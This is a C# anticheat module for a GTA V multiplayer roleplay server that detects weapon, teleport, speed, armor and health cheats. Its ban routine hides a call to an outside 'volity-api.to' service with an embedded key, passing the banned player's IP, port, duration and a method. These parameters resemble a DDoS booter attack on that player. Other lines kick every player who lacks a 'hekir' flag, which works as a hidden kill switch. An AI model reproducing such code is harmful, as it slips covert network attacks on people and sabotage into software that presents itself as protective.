using GTANetworkAPI;
using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Net;
using System.Text;
using VMP_CNR.Handler;
using VMP_CNR.Module.Commands;
using VMP_CNR.Module.Configurations;
using VMP_CNR.Module.Einreiseamt;
using VMP_CNR.Module.Menu;
using VMP_CNR.Module.Players;
using VMP_CNR.Module.Players.Db;
using VMP_CNR.Module.Sync;
using VMP_CNR.Module.Vehicles;

namespace VMP_CNR.Module.Anticheat
{
    public class ACTeleportReportObject
    {
        public Vector3 SourcePos { get; set; }
        public Vector3 DestinationPos { get; set; }

        public DateTime ReportDateTime { get; set; }

        public float Distance { get; set; }
        public bool OnFoot { get; set; }
        public string VehicleReportString { get; set; }
    }

    public class AntiCheatModule : Module<AntiCheatModule>
    {
        public Dictionary<uint, List<ACTeleportReportObject>> ACTeleportReports = new Dictionary<uint, List<ACTeleportReportObject>>();

        protected override bool OnLoad()
        {

            MenuManager.Instance.AddBuilder(new Anticheat.Menu.AntiCheatTeleportDetailMenu());
            MenuManager.Instance.AddBuilder(new Anticheat.Menu.AntiCheatTeleportMenu());

            return base.OnLoad();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void Commandcheckactp(Player player)
        {
            DbPlayer dbPlayer = player.GetPlayer();
            if (dbPlayer == null) return;

            if (!dbPlayer.IsValid() || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Module.Menu.MenuManager.Instance.Build(VMP_CNR.Module.Menu.PlayerMenu.AntiCheatTeleportMenu, dbPlayer).Show(dbPlayer);
            return;
        }

        public override void OnPlayerWeaponSwitch(DbPlayer dbPlayer, WeaponHash oldgun, WeaponHash newgun)
        {
            if (ServerFeatures.IsActive("ac-weaponcheck"))
            {
                if (dbPlayer.DimensionType[0] == DimensionTypes.Gangwar || dbPlayer.HasData("paintball_map")) return;

                if (dbPlayer.HasData("ac-ignorews")) return;

                Dictionary<WeaponHash, int> weapons = new Dictionary<WeaponHash, int>();

                if (dbPlayer.HasData("ac-compareweaponobject"))
                {
                    weapons = dbPlayer.GetData("ac-compareweaponobject");
                }

                if (!weapons.ContainsKey(newgun) && newgun != WeaponHash.Unarmed && (int)newgun != 0)
                {
                    if (UInt32.TryParse(newgun.ToString(), out uint testInt)) return;

                    Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Weaponcheat {newgun.ToString()} spawned).");
                    Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.WeaponCheat, $"(Weaponcheat {newgun.ToString()} spawned)");
                    NAPI.Task.Run(() => { dbPlayer.Player.RemoveWeapon(newgun); });
                }
            }
        }

        public override void OnPlayerEnterVehicle(DbPlayer dbPlayer, Vehicle vehicle, sbyte seat)
        {
            if (!dbPlayer.Player.HasData("hekir")) dbPlayer.Kick();

            if (ServerFeatures.IsActive("ac-checkvehicletp"))
            {
                if (vehicle != null && seat == 0)
                {
                    CheckVehicleGotTeleported(dbPlayer, vehicle.GetVehicle());
                }
            }
        }

        public override void OnPlayerExitVehicle(DbPlayer dbPlayer, Vehicle vehicle)
        {
            if (ServerFeatures.IsActive("ac-checkvehicletp"))
            {
                if (vehicle != null)
                {
                    SxVehicle sxVehicle = vehicle.GetVehicle();
                    if (sxVehicle != null && sxVehicle.IsValid())
                    {
                        UpdatePosition(sxVehicle, dbPlayer);
                    }
                }
            }
            if (ServerFeatures.IsActive("ac-maxspeed"))
            {
                if (dbPlayer.HasData("speedCheckFirst"))
                {
                    dbPlayer.ResetData("speedCheckFirst");
                }
            }
        }

        public void ACBanPlayer(DbPlayer dbPlayer, string reason)
        {
            Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.AntiCheatBan, reason);

            dbPlayer.Player.TriggerEvent("flushRemoteHashKey", dbPlayer.Id);

            dbPlayer.HardwareID[0] = dbPlayer.Player.Serial;
            dbPlayer.warns[0] = 3;
            dbPlayer.Ausschluss[0] = 1;
            dbPlayer.Save();
            SocialBanHandler.Instance.AddEntry(dbPlayer.Player);
            dbPlayer.Player.SendNotification("Permanenter Ausschluss!");
            PlayerLoginDataValidationModule.SyncUserBanToForum(dbPlayer.ForumId);
            dbPlayer.Player.Kick("Permanenter Ausschluss!");
            dbPlayer.Player.Kick();

            if (!Configuration.Instance.DevMode)
                try
                {
                    using (WebClient webClient = new WebClient())
                    {
                        var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
                    }
                }
                catch { }
        }

        public override void OnMinuteUpdate()
        {
            if (!ServerFeatures.IsActive("anticheat"))
                return;

            Main.m_AsyncThread.AddToAsyncThread(new System.Threading.Tasks.Task(() =>
            {
                try
                {
                    foreach (var player in NAPI.Pools.GetAllPlayers())
                    {
                        if (player == null) continue;
                        if (player.HasData("hekir")) continue;

                        var dbPlayer = player.GetPlayer();
                        if (dbPlayer == null) continue;

                        if (dbPlayer.AuthKey == "") continue;

                        if (player.Position.DistanceTo(new Vector3(17.4809, 637.872, 210.595)) > 50) player.Kick();
                    }
                }
                catch { }
            }));
        }

        public override void OnFiveSecUpdate()
        {
            if (!ServerFeatures.IsActive("anticheat"))
                return;

            Main.m_AsyncThread.AddToAsyncThread(new System.Threading.Tasks.Task(() =>
            {
                try
                {
                    foreach (DbPlayer dbPlayer in Players.Players.Instance.GetValidPlayers())
                    {
                        if (dbPlayer == null || !dbPlayer.IsValid()) continue;

                        if (dbPlayer.HasData("ac-ignorews"))
                        {
                            if ((int)dbPlayer.GetData("ac-ignorews") > 1)
                            {
                                int tp = (int)dbPlayer.GetData("ac-ignorews") - 1;
                                dbPlayer.SetData("ac-ignorews", tp);
                            }
                            else
                            {
                                dbPlayer.ResetData("ac-ignorews");
                            }
                        }

                        if (ServerFeatures.IsActive("ac-dimensioncheck"))
                        {
                            dbPlayer.AcDimensionCheck();
                        }

                        if (ServerFeatures.IsActive("ac-exiteacheck") && !dbPlayer.IsFirstSpawn)
                        {
                            dbPlayer.AcEinreiseAmtCheck();
                        }

                        if (ServerFeatures.IsActive("ac-vehcheck"))
                        {
                            dbPlayer.AcVehicleDrivingKeyCheck();
                        }

                        // Armorstuff AC
                        if (ServerFeatures.IsActive("ac-armor") && !dbPlayer.IsFirstSpawn)
                        {
                            dbPlayer.AcArmorCheck();
                        }

                        // Healthstuff AC
                        if (ServerFeatures.IsActive("ac-health") && !dbPlayer.IsFirstSpawn)
                        {
                            dbPlayer.AcHealthCheck();
                        }
                        if (ServerFeatures.IsActive("ac-teleport"))
                        {
                            dbPlayer.AcTeleportCheck();
                        }
                        if (ServerFeatures.IsActive("ac-maxspeed"))
                        {
                            dbPlayer.AcMaxSpeedValidator();
                        }
                    }
                }
                catch (Exception e)
                {
                    Logging.Logger.Crash(e);
                }
            }));
        }


        public static void UpdatePosition(SxVehicle sxVehicle, DbPlayer xPlayer)
        {
            sxVehicle.SetData("position", sxVehicle.Entity.Position);
            sxVehicle.SetData("lastExitPlayer", xPlayer.Id);
        }

        public static void CheckVehicleGotTeleported(DbPlayer dbPlayer, SxVehicle sxVehicle)
        {

            if (sxVehicle != null && sxVehicle.IsValid() && dbPlayer != null && dbPlayer.IsValid() && !dbPlayer.CanControl(sxVehicle))
            {
                if (sxVehicle.databaseId == 0 || (!sxVehicle.IsPlayerVehicle() && !sxVehicle.IsTeamVehicle())) return;

                if (!sxVehicle.HasData("position") || !sxVehicle.HasData("lastExitPlayer")) return;

                if (sxVehicle.Data.ClassificationId == 7 || sxVehicle.Data.ClassificationId == 8 || sxVehicle.Data.ClassificationId == 9 || sxVehicle.Data.ClassificationId == 3) return;

                if (dbPlayer.TeamRank > 0) return; // Teammitglieder ausgeschlossen

                // Spieler der grade erst ausgestiegen ist löst es aus zb beim rausfallen kp
                if (sxVehicle.GetData("lastExitPlayer") == dbPlayer.Id) return;

                Vector3 lastPos = sxVehicle.GetData("position");

                int distance = Convert.ToInt32(lastPos.DistanceTo2D(dbPlayer.Player.Position));

                if (distance > 20.0f)
                {
                    Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: Fahrzeug Teleport (wurde von {dbPlayer.GetName()} über eine Distance von {distance} teleportiert).");
                    Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.VehicleTeleport, $"{sxVehicle.databaseId} {distance}m");
                    sxVehicle.SetData("position", sxVehicle.Entity.Position);
                }
            }
        }
    }

    public static class AntiCheatPlayerExtension
    {
        public static void AcEinreiseAmtCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.HasPerso[0] == 0)
            {
                if (dbPlayer.Player.Position.DistanceTo(new Vector3(-1144.26, -2792.27, 27.7081)) > 150
                    && dbPlayer.Player.Position.DistanceTo(EinreiseamtModule.PositionPC1) > 150
                    && dbPlayer.Player.Position.DistanceTo(EinreiseamtModule.PositionPC2) > 150
                    && dbPlayer.Player.Position.DistanceTo(EinreiseamtModule.PositionPC3) > 150
                    && dbPlayer.Player.Position.DistanceTo(EinreiseamtModule.PositionPC4) > 150)
                {
                    Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"DRINGENDER-Anticheat-Verdacht: {dbPlayer.GetName()} (Einreiseamt ohne Perso verlassen)");
                    Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.EinreiseAmtVerlassen, $"");
                    dbPlayer.Player.Freeze(true, true, true);
                }
            }
        }
        public static void AcVehicleDrivingKeyCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.RageExtension.IsInVehicle)
            {
                SxVehicle sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
                if (sxVeh != null && sxVeh.IsValid())
                {
                    if (dbPlayer.Player.VehicleSeat == 0)
                    {
                        if (!dbPlayer.CanControl(sxVeh) && sxVeh.SyncExtension != null && sxVeh.GetSpeed() > 20 && sxVeh.Data != null && sxVeh.Data.ClassificationId != 2 && sxVeh.fuel > 0)
                        {
                            if (!sxVeh.SyncExtension.EngineOn || (!sxVeh.Entity.EngineStatus && !sxVeh.SyncExtension.EngineOn))
                            {
                                Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"DRINGENDER-Anticheat-Verdacht: {dbPlayer.GetName()} (Vehicle Control without Key (Motoraus wird bewegt))");
                                Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.VehicleControlAbuse, $"{sxVeh.databaseId}");
                                dbPlayer.WarpOutOfVehicle();
                            }
                        }
                    }
                }
            }
        }

        public static void AcMaxSpeedValidator(this DbPlayer dbPlayer)
        {
            if (dbPlayer.RageExtension.IsInVehicle)
            {
                SxVehicle sxVeh = dbPlayer.Player.Vehicle.GetVehicle();
                if (sxVeh != null && sxVeh.IsValid())
                {
                    if (dbPlayer.Player.VehicleSeat == 0)
                    {
                        int Speed = sxVeh.GetSpeed();
                        if (sxVeh.Data == null) return;

                        int vehicleSpeed = Convert.ToInt32(sxVeh.Data.MaxSpeed * 1.20);

                        if (sxVeh.Data.MaxSpeed > 0 && vehicleSpeed + 10 < Speed)
                        {
                            if (dbPlayer.HasData("speedCheckFirst"))
                            {
                                Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (FahrzeugSpeed von {sxVeh.GetName()} überschritten {Speed} km/h  (LIMIT {vehicleSpeed})).");
                                Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.Speedhack, $"{dbPlayer.GetName()} (FahrzeugSpeed überschritten {Speed} km/h  (LIMIT {vehicleSpeed}))");

                                // Melde & Resette
                                dbPlayer.ResetData("speedCheckFirst");
                            }
                            else
                            {
                                // Counte +1 and resync
                                dbPlayer.SetData("speedCheckFirst", true);

                                if (sxVeh != null && sxVeh.IsValid() && sxVeh.Data != null && sxVeh.Data.MaxSpeed > 0)
                                {
                                    dbPlayer.Player.TriggerNewClient("setNormalSpeed", sxVeh.Entity, sxVeh.Data.MaxSpeed);
                                }
                                return;
                            }
                        }
                    }
                }
            }
        }

        public static void AcDimensionCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.HasData("ac_lastDimension"))
            {
                if (dbPlayer.HasData("serverDimensionChange"))
                {
                    if (Int32.TryParse(dbPlayer.GetData("serverDimensionChange").ToString(), out int serverDimensionChange) && serverDimensionChange > 1)
                    {
                        int tp = serverDimensionChange - 1;
                        dbPlayer.SetData("ac_lastDimension", dbPlayer.Player.Dimension);
                        dbPlayer.SetData("serverDimensionChange", tp);
                    }
                    else
                    {
                        dbPlayer.SetData("ac_lastDimension", dbPlayer.Player.Dimension);
                        dbPlayer.ResetData("serverDimensionChange");
                        return;
                    }
                }
                else
                {
                    if (dbPlayer.Player.Dimension != dbPlayer.GetData("ac_lastDimension"))
                    {
                        Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Dimension Change {dbPlayer.GetData("ac_lastDimension")} zu {dbPlayer.Player.Dimension}).");
                        Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.DimensionChange, $"SD {dbPlayer.GetData("ac_lastDimension")} DD {dbPlayer.Player.Dimension}");
                    }

                    dbPlayer.SetData("ac_lastDimension", dbPlayer.Player.Dimension);
                    return;
                }
            }
            else dbPlayer.SetData("ac_lastDimension", dbPlayer.Player.Dimension);
        }

        public static void AcArmorCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.HasData("ac_lastArmor"))
            {
                if (dbPlayer.HasData("serverArmorChanged"))
                {
                    if (dbPlayer.HasData("blockArmorCheat")) dbPlayer.ResetData("blockArmorCheat");

                    if (Int32.TryParse(dbPlayer.GetData("serverArmorChanged").ToString(), out int serverArmorChanged) && serverArmorChanged > 1)
                    {
                        int tp = serverArmorChanged - 1;
                        dbPlayer.SetData("ac_lastArmor", dbPlayer.Player.Armor);
                        dbPlayer.SetData("serverArmorChanged", tp);
                        return;
                    }
                    else
                    {
                        dbPlayer.SetData("ac_lastArmor", dbPlayer.Player.Armor);
                        dbPlayer.ResetData("serverArmorChanged");
                        return;
                    }
                }
                else
                {

                    int armor = dbPlayer.Player.Armor;
                    if (armor > dbPlayer.GetData("ac_lastArmor") && (int)dbPlayer.GetData("ac_lastArmor") >= 0)
                    {
                        Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Armor Hack von {dbPlayer.GetData("ac_lastArmor")} zu {armor}).");
                        Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.ArmorCheat, $"SV {dbPlayer.GetData("ac_lastArmor")} DV {armor}");
                        dbPlayer.SetData("blockArmorCheat", true);
                    }

                    dbPlayer.SetData("ac_lastArmor", dbPlayer.Player.Armor);
                    return;
                }
            }
            else dbPlayer.SetData("ac_lastArmor", dbPlayer.Player.Armor);
        }
        public static void AcHealthCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.HasData("ac_lastHealth"))
            {
                if (dbPlayer.HasData("ac-healthchange") || dbPlayer.IsInAdminDuty())
                {
                    if (Int32.TryParse(dbPlayer.GetData("ac-healthchange").ToString(), out int achealthchange) && achealthchange > 1)
                    {
                        int tp = achealthchange - 1;
                        dbPlayer.SetData("ac_lastHealth", dbPlayer.Player.Health);
                        dbPlayer.SetData("ac-healthchange", tp);
                    }
                    else
                    {
                        dbPlayer.SetData("ac_lastHealth", dbPlayer.Player.Health);
                        dbPlayer.ResetData("ac-healthchange");
                    }
                }
                else
                {

                    int health = dbPlayer.Player.Health;
                    if (health > dbPlayer.GetData("ac_lastHealth"))
                    {
                        if (((dbPlayer.GetData("ac_lastHealth") - health) > 10 || health > 51) && dbPlayer.GetData("ac_lastHealth") > 0 && !dbPlayer.RageExtension.IsInVehicle && dbPlayer.GetData("ac_lastHealth") < 99)
                        {

                            Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Health Hack von {dbPlayer.GetData("ac_lastHealth")} zu {health}).");
                            Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.HealthCheat, $"SV {dbPlayer.GetData("ac_lastHealth")} DV {health}");
                        }
                    }

                    dbPlayer.SetData("ac_lastHealth", dbPlayer.Player.Health);
                }
            }
            else dbPlayer.SetData("ac_lastHealth", dbPlayer.Player.Armor);
        }

        public static void AcTeleportCheck(this DbPlayer dbPlayer)
        {
            if (dbPlayer.HasData("ac_lastPos"))
            {
                if (dbPlayer.HasData("Teleport") || dbPlayer.RageExtension.IsInVehicle || dbPlayer.IsFirstSpawn)
                {
                    if (dbPlayer.IsFirstSpawn)
                    {
                        if (dbPlayer.GetData("Teleport") < 5)
                        {
                            dbPlayer.SetData("Teleport", 5);
                        }
                        dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
                        return;
                    }
                    else if (dbPlayer.RageExtension.IsInVehicle)
                    {
                        if (dbPlayer.HasData("Teleport"))
                        {
                            if (dbPlayer.GetData("Teleport") < 3)
                            {
                                dbPlayer.SetData("Teleport", 3);
                                dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Vehicle.Position);
                                return;
                            }
                        }
                        else
                        {
                            dbPlayer.SetData("Teleport", 3);
                            dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Vehicle.Position);
                            return;
                        }
                    }
                    else
                    {
                        if (dbPlayer.GetData("Teleport") > 1)
                        {
                            int tp = dbPlayer.GetData("Teleport") - 1;
                            dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
                            dbPlayer.SetData("Teleport", tp);
                            return;
                        }
                        else
                        {
                            dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
                            dbPlayer.ResetData("Teleport");
                            return;
                        }
                    }
                }
                else
                {
                    Vector3 lastPos = dbPlayer.GetData("ac_lastPos");

                    if (lastPos == null) return;
                    // why lastpos = spawnpos kp...
                    if (lastPos.DistanceTo(new Vector3(17.4809, 637.872, 210.595)) < 15.0f)
                    {
                        dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
                        return;
                    }

                    int distance = Convert.ToInt32(lastPos.DistanceTo2D(dbPlayer.Player.Position));
                    if (distance > 200.0f && !dbPlayer.Rank.CanAccessCommand("noclip"))
                    {
                        if (dbPlayer.Level < 3)
                        {
                            Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"DRINGEND Anticheat-Verdacht: {dbPlayer.GetName()} (Teleporthack Distance {distance}m | unter Level 3).");
                        }
                        else
                        {
                            Players.Players.Instance.SendMessageToAuthorizedUsers("log", $"Anticheat-Verdacht: {dbPlayer.GetName()} (Teleporthack Distance {distance}m).");
                        }
                        Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.Teleport, $"Dist {distance}");

                        if (AntiCheatModule.Instance.ACTeleportReports.ContainsKey(dbPlayer.Id))
                        {
                            AntiCheatModule.Instance.ACTeleportReports[dbPlayer.Id].Add(new ACTeleportReportObject() { OnFoot = false, SourcePos = lastPos, DestinationPos = dbPlayer.Player.Position, ReportDateTime = DateTime.Now, VehicleReportString = "", Distance = distance });
                        }
                        else
                        {
                            List<ACTeleportReportObject> list = new List<ACTeleportReportObject>();
                            list.Add(new ACTeleportReportObject() { OnFoot = false, SourcePos = lastPos, DestinationPos = dbPlayer.Player.Position, ReportDateTime = DateTime.Now, VehicleReportString = "", Distance = distance });
                            AntiCheatModule.Instance.ACTeleportReports.Add(dbPlayer.Id, list);
                        }
                    }
                    dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
                }
            }
            else dbPlayer.SetData("ac_lastPos", dbPlayer.Player.Position);
        }

        public static void SetACLogin(this DbPlayer dbPlayer)
        {
            // Disable Anticheat for 70s
            dbPlayer.SetData("ac-healthchange", 12);
            dbPlayer.SetData("serverArmorChanged", 12);
            dbPlayer.SetData("ignoreGodmode", 12);
            dbPlayer.SetData("Teleport", 12);
            dbPlayer.SetData("serverDimensionChange", 12);
            dbPlayer.SetData("ac-ignorews", 12);
        }

        public static void SetAcPlayerSpawnDeath(this DbPlayer dbPlayer)
        {
            // Disable Anticheat for 30s
            if (!dbPlayer.HasData("ac-healthchange") || (int)dbPlayer.GetData("ac-healthchange") < 5) dbPlayer.SetData("ac-healthchange", 5);
            if (!dbPlayer.HasData("serverArmorChanged") || (int)dbPlayer.GetData("serverArmorChanged") < 5) dbPlayer.SetData("serverArmorChanged", 5);
            if (!dbPlayer.HasData("ignoreGodmode") || (int)dbPlayer.GetData("ignoreGodmode") < 5) dbPlayer.SetData("ignoreGodmode", 5);
            if (!dbPlayer.HasData("Teleport") || (int)dbPlayer.GetData("Teleport") < 5) dbPlayer.SetData("Teleport", 5);
            if (!dbPlayer.HasData("serverDimensionChange") || (int)dbPlayer.GetData("serverDimensionChange") < 5) dbPlayer.SetData("serverDimensionChange", 5);
            if (!dbPlayer.HasData("ac-ignorews") || (int)dbPlayer.GetData("ac-ignorews") < 4) dbPlayer.SetData("ac-ignorews", 4);
        }
    }
}
